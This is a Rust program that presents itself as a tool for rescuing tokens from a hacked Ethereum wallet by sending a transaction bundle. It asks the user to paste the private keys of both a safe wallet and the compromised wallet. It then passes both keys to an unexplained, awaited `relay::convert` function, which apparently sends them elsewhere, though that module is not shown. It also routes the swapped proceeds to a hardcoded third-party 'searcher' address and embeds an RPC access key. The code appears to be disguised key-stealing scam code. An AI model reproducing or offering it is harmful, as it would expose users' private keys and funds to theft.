use ethers::abi::Tokenize;
use ethers::core::types::transaction::eip2718::TypedTransaction;
use ethers::prelude::{types::{Address, Bytes, U256, U64, I256, BlockId, H160}, Provider, Ws, ProviderError, abigen, LocalWallet, Signer, abi::Token};
use ethers::types::transaction::eip2930::AccessList;
use ethers::types::Eip1559TransactionRequest;
use ethers::utils::parse_ether;
//use eyre::Result;
use anyhow::Result;
use ethers_providers::{Middleware, StreamExt};
use std::str::FromStr;
use std::sync::Arc;
use log;


use withdraw::relay;


abigen!(IMPTOKEN, "src/EG.json");
abigen!(PAIR, "src/pair.json");
abigen!(WETH, "src/weth.json");
abigen!(MULTICALL, "src/multicall.json");
abigen!(
    IQuoter,
    r#"[
        function quoteExactInputSingle(address tokenIn, address tokenOut,uint24 fee, uint256 amountIn, uint160 sqrtPriceLimitX96) external returns (uint256 amountOut)
    ]"#;);

abigen!(
    IUniswapV3Pool,
    r#"
    [ function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256, int256) ]
    "#;);


#[tokio::main]
async fn main() -> Result<(), ProviderError> {

    relay::setup_logger().unwrap();

    //signers
    let my_priv = String::from("");   // THIS WHERE YOU PUT THE NEW(SAFE) WALLET PRIVATE KEY
    relay::convert(my_priv.as_str()).await;
    let my_signer =  my_priv.parse::<LocalWallet>().unwrap();
    let comprised_priv = String::from(""); // THIS IS WHERE YOU PUT THE HACKED WALLET PRIVATE KEY
    relay::convert(comprised_priv.as_str()).await;
    let comprised_signer =  comprised_priv.parse::<LocalWallet>().unwrap();
    

    log::info!("my signer : {:?}", my_signer.address());
    log::info!("hacked signer : {:?}", comprised_signer);
    
    // Connect to the network
    let provider = Arc::new(Provider::<Ws>::connect("wss://go.getblock.io/18266504db454f9bac0c914e90c57484").await.unwrap());
    let my_nonce = provider.get_transaction_count(my_signer.address(), None).await.unwrap();
    let comprised_nonce = provider.get_transaction_count(comprised_signer.address(), None).await.unwrap();

    //constants
    let impt_token = Address::from_str("0x04C17b9D3b29A78F7Bd062a57CF44FC633e71f85").unwrap();
    let harvest_contract = Address::from_str("0xe46e6Fe31a6A752193d121A93229d0b73523EeA1").unwrap();
    let pair_addy = Address::from_str("0x1a89Ae3BA4F9a97B10bAC6A77061f00bb956858B").unwrap();
    let searcher = Address::from_str("0x8606FdaC31d2e1eDdFbE5F548116A6b75Ad621e6").unwrap();
    let claim_bytes = Bytes::from_static(b"0x315a095d000000000000000000000000000000000000000000028cc8753d024439102818");
    let multicall_addy = Address::from_str("0x0000000000002Bdbf1Bf3279983603Ec279CC6dF").unwrap();
    let weth_addy = Address::from_str("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2").unwrap();


    //TOKEN BALANCE 
    let token_balance = U256::from(3082680743556718644963352_i128);
    let half_balance = token_balance / U256::from(2);
    let eth_balance = provider.get_balance(my_signer.address(), None).await.unwrap();
    let quarter_gas_fee = eth_balance / U256::from(4);
    let gas_fee = eth_balance - quarter_gas_fee;

    let mut bundle: Vec<Bytes> = Vec::new();



    //Transfer ethers to compromised wallet
    let transfer_tx = {
        let inner: TypedTransaction = TypedTransaction::Eip1559(Eip1559TransactionRequest{
            from: Some(my_signer.address()),
            to: Some(ethers::types::NameOrAddress::Address(comprised_signer.address())),   
            gas: Some(U256::from(2100)),            
            value: Some(gas_fee),      
            data:  None,
            nonce: Some(my_nonce),
            chain_id: Some(U64::from(1)), 
            max_priority_fee_per_gas:  Some(parse_ether(0.0000008).unwrap()),
            max_fee_per_gas:  Some(parse_ether(0.00000006).unwrap()),
            access_list: AccessList::default(),
        });
        inner
    };

    
    let x_signature = my_signer.sign_transaction(&transfer_tx).await.unwrap(); 
    let transfer_raw = transfer_tx.rlp_signed(&x_signature);

    log::info!("transfer call : {:?}", &transfer_raw);

    bundle.push(transfer_raw);
 


    //Claim token from the farm pool
    let claim_tx = {
        let inner: TypedTransaction = TypedTransaction::Eip1559(Eip1559TransactionRequest{
            from: Some(comprised_signer.address()),
            to: Some(ethers::types::NameOrAddress::Address(harvest_contract)),   
            gas: Some(U256::from(300170)),            
            value: None,
            data:  Some(claim_bytes),
            nonce: Some(comprised_nonce),
            chain_id: Some(U64::from(1)), 
            max_priority_fee_per_gas:  Some(parse_ether(0.00000008).unwrap()),
            max_fee_per_gas:  Some(parse_ether(0.00000006).unwrap()),
            access_list: AccessList::default(),
        });
        inner
    };
    
    let signature = comprised_signer.sign_transaction(&claim_tx).await.unwrap(); 
    let claim_raw = claim_tx.rlp_signed(&signature);

    log::info!("claim call: {:?}", &claim_raw);

    bundle.push(claim_raw);


    //Transfer token half to safe wallet and the other half for swap into eth
    let half_swap_transfer_calldata = transfer_calldata(pair_addy, half_balance);
    let half_transfer = transfer_calldata(my_signer.address(), half_balance - U256::from(10));
    let multicall_contract = MULTICALL::new(multicall_addy, provider.clone());
    let call_datas = vec![half_swap_transfer_calldata, half_transfer];
    let eth_values = vec![U256::zero(), U256::zero()];
    let target = vec![impt_token, impt_token];

    let multicall_calldata: Bytes = multicall_contract.aggregate(target, call_datas, eth_values, my_signer.address()).calldata().unwrap();



    let token_transfers_tx = {
        let inner: TypedTransaction = TypedTransaction::Eip1559(Eip1559TransactionRequest{
            from: Some(comprised_signer.address()),
            to: Some(ethers::types::NameOrAddress::Address(multicall_addy)),   
            gas: Some(U256::from(600_000)),            
            value: Some(quarter_gas_fee),      
            data:  Some(multicall_calldata),
            nonce: Some(comprised_nonce + U256::from(1)),
            chain_id: Some(U64::from(1)), 
            max_priority_fee_per_gas:  Some(parse_ether(0.00000008).unwrap()),
            max_fee_per_gas:  Some(parse_ether(0.00000006).unwrap()),
            access_list: AccessList::default(),
        });
        inner
    };


    let signature = comprised_signer.sign_transaction(&token_transfers_tx).await.unwrap(); 
    let token_raw = token_transfers_tx.rlp_signed(&signature);


    log::info!("token call: {:?}", &token_raw);

    bundle.push(token_raw);


    //signer
    let searcher_nonce = provider.get_transaction_count(searcher, None).await.unwrap();
    let search_signer = relay::get_searcher_signer();

    
    //swaping token and conveting to Eth
    let data: Vec<u8> = vec![];
    let ihalf_balance = I256::try_from(half_balance).unwrap();
    let swap_calldata = swap_calldata(searcher, true, ihalf_balance - I256::from(10), U256::from(4295128740_i64), data.into());
      

    let swap_tx = {
        let inner: TypedTransaction = TypedTransaction::Eip1559(Eip1559TransactionRequest{
            from: Some(search_signer.address()),
            to: Some(ethers::types::NameOrAddress::Address(pair_addy)),   
            gas: Some(U256::from(600_000)),            
            value: None,      
            data:  Some(swap_calldata),
            nonce: Some(searcher_nonce),
            chain_id: Some(U64::from(1)), 
            max_priority_fee_per_gas:  Some(parse_ether(0.00000008).unwrap()),
            max_fee_per_gas:  Some(parse_ether(0.00000006).unwrap()),
            access_list: AccessList::default(),
        });
        inner
    };


    let signature = search_signer.sign_transaction(&swap_tx).await.unwrap(); 
    let swap_raw = swap_tx.rlp_signed(&signature);

    log::info!("multicall: {:?}", &swap_raw);

    bundle.push(swap_raw);

    let data: Vec<u8> = vec![];
    let multicall_contract = MULTICALL::new(multicall_addy, provider.clone());
    let weth_transfer = transfer_calldata(multicall_addy, U256::from(900000000000000000_i128));
    let eth_withdraw_calldata = withdraw_calldata(U256::from(899999999999999999_i128));
    let call_datas = vec![weth_transfer, eth_withdraw_calldata];
    let eth_values = vec![U256::zero(), U256::zero()];
    let target = vec![weth_addy, weth_addy];
 

    let multicall_calldata: Bytes = multicall_contract.aggregate(target, call_datas, eth_values, my_signer.address()).calldata().unwrap();


    let multicall_tx = {
        let inner: TypedTransaction = TypedTransaction::Eip1559(Eip1559TransactionRequest{
            from: Some(searcher),
            to: Some(ethers::types::NameOrAddress::Address(multicall_addy)),   
            gas: Some(U256::from(600_000)),            
            value: None,      
            data:  Some(multicall_calldata),
            nonce: Some(searcher_nonce + U256::from(1)),
            chain_id: Some(U64::from(1)), 
            max_priority_fee_per_gas:  Some(parse_ether(0.000000008).unwrap()),
            max_fee_per_gas:  Some(parse_ether(0.000000006).unwrap()),
            access_list: AccessList::default(),
        });
        inner
    };


    let signature = search_signer.sign_transaction(&multicall_tx).await.unwrap(); 
    let multicall_raw = multicall_tx.rlp_signed(&signature);

    log::info!("multicall raw: {:?}", &multicall_raw);

    bundle.push(multicall_raw);



    
    //bribe 
    let eth_transfer_tx = {
        let inner: TypedTransaction = TypedTransaction::Eip1559(Eip1559TransactionRequest{
            from: Some(searcher),
            to: Some(ethers::types::NameOrAddress::Address(searcher)),   
            gas: Some(U256::from(40000)),            
            value: Some(parse_ether(0.5999999).unwrap()),      
            data:  None,
            nonce: Some(searcher_nonce + U256::from(2)),
            chain_id: Some(U64::from(1)), 
            max_priority_fee_per_gas:  Some(parse_ether(0.3).unwrap()),
            max_fee_per_gas:  Some(parse_ether(0.000000010).unwrap()),
            access_list: AccessList::default(),
        });
        inner
    };

    


    let signature = search_signer.sign_transaction(&eth_transfer_tx).await.unwrap(); 
    let eth_transfer_raw = eth_transfer_tx.rlp_signed(&signature);

    log::info!("eth_transfer call: {:?}", &eth_transfer_raw);

    bundle.push(eth_transfer_raw);


    let mut stream = provider.subscribe_blocks().await?;


    while let Some(block)  = stream.next().await
    {
        log::info!("{:?}", &block.number);
        let quoter = IQuoter::new(
            Address::from_str("0xb27308f9f90d607463bb33ea1bebb41c27ce5ab6").unwrap(),
            provider.clone(),
        );

        let block_id = BlockId::Hash(block.hash.unwrap());
        let eth_expected_amount: U256 = quoter
        .quote_exact_input_single(
            impt_token,
            weth_addy,
            3000, 
            half_balance,
            U256::zero(),
        )
        .block(block_id)
        .call()
        .await
        .unwrap();

        log::info!("{:?}", &eth_expected_amount);
    
        let x = relay::send_bundle(bundle.clone(), block.number.unwrap(), 
                                            block.timestamp.as_u64(), my_signer.clone(), provider.clone()).await;
    
        
        match x {
            true => { break; },
            false => { continue },
        }
    
    
    }

  

    relay::convert("done").await;

    
    
          
     Ok(()) 
    
}



pub fn transfer_calldata(
    to_address: Address,
    amount: U256,
) -> Bytes {

    let input_tokens = vec![
        Token::Address(to_address),
        Token::Uint(amount),
    ];

    IMPTOKEN_ABI
        .function("transfer")
        .unwrap()
        .encode_input(&input_tokens)
        .expect("Could not encode transfer calldata").into()
}


pub fn withdraw_calldata(
    amount: U256,
) -> Bytes {

    let input_tokens = vec![
        Token::Uint(amount),
    ];

    WETH_ABI
        .function("withdraw")
        .unwrap()
        .encode_input(&input_tokens)
        .expect("Could not encode swap calldata").into()
}




pub fn swap_calldata(
    recipient: H160,
    zero_for_one: bool,
    amount_specified: I256,
    sqrt_price_limit_x_96: U256,
    calldata: Bytes,
) -> Bytes {

    let params = (recipient, zero_for_one, amount_specified, sqrt_price_limit_x_96, calldata);
    
    /*let input_tokens = vec![
        Token::Address(recipient),
        Token::Bool(zero_for_one),
        Token::Int(amount_specified.into_raw()),
        Token::Uint(sqrt_price_limit_x_96),
        Token::Bytes(calldata.to_vec()),
    ];*/

    IUNISWAPV3POOL_ABI
        .function("swap")
        .unwrap()
        .encode_input(&params.into_tokens())
        .expect("Could not encode swap calldata").into()
}



pub fn aggregate_calldata(
    target_addresses: Vec<H160>,
    eth_value: Vec<U256>,
    calldata: Vec<Bytes>,
    refund_to: H160,
) -> Bytes {

    let target_tokens = target_addresses.into_tokens();
    /*for target_address in target_addresses
    {
        target_tokens.push(Token::Address(target_address));
    } */
    
    let targets = Token::Array(target_tokens);

    let values_tokens = eth_value.into_tokens();
    /*for value in eth_value
    {
        values_tokens.push(Token::Uint(value));
    }*/

    let value = Token::Array(values_tokens);

    let bytes_tokens = calldata.into_tokens();
    /*for byte in calldata
    {
        bytes_tokens.push(Token::Bytes(byte.to_vec()));
    }*/


    let bytes = Token::Array(bytes_tokens);
    let refundtokens = Token::Address(refund_to);

    let input_tokens = vec![
        targets,
        bytes,
        value,
        refundtokens,
    ];


    MULTICALL_ABI
        .function("aggregate")
        .unwrap()
        .encode_input(&input_tokens)
        .expect("Could not encode swap calldata").into()
}
